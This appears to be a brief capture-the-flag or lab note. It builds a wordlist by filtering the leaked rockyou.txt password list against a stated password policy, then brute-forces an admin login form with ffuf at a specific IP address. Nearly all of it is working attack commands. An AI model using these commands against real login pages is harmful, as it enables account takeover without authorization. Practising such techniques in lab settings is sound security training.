Password policy:
- at least one upper-case character
- at least one lower-case character
- contains at least one digit
- minimum length of 10 characters

**Grab from rockyou.txt passwords that follow the policy
```
grep '[[:upper:]]' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
```

```
ffuf -w ./custom_wordlist.txt -u http://94.237.120.119:30148/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"
```
